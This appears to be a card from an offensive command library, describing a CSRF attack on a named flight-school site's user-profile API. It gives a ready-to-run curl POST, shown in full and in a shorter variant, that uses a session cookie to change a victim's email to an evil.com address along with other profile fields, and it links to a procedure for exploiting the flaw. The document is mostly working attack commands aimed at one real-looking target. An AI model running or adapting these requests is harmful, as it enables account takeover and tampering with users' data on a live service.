---
id: 5c87ab6d-dc64-4ade-90a5-682935f74836
name: update-user-profile
type: command
executor: bash
data: >-
  curl -X POST https://twitterflightschool.com/api/users/me -H "Cookie:
  connect.sid=████" -H "Content-Type: application/x-www-form-urlencoded" -d
  "country=IN&email=test@evil.com&firstname=prashanth&lastname=varma&language=en-US&twitterId=1192789765&username=prashanth_scss&companyType=other&othercompany=lol"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:29.774Z'
platforms:
  - Web
tags:
  - csrf
  - profile
verified: false
validated: true
submitted: true
---

# update-user-profile

## Command

```bash
curl -X POST https://twitterflightschool.com/api/users/me \
  -H "Cookie: connect.sid=████" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "country=IN&email=test@evil.com&firstname=prashanth&lastname=varma&language=en-US&twitterId=1192789765&username=prashanth_scss&companyType=other&othercompany=lol"
```

## Description

Updates user profile via CSRF-vulnerable endpoint using session cookie to forge changes to email, name, and other details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d "country=...&email=..."` | Form data for profile fields | Yes |
| `-H "Cookie: ..."` | Session authentication | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://twitterflightschool.com/api/users/me -H "Cookie: connect.sid=████" -d "email=new@evil.com"
```

### Advanced Usage

Full payload as above for comprehensive update.

## Expected Output

HTTP 200 with updated user object, e.g., {"user": {"email": "test@evil.com"}}.

## Related

- [[procedures/Exploit-CSRF-to-Update-User-Profile]]
- [[commands/post-to-twitter-timeline]]
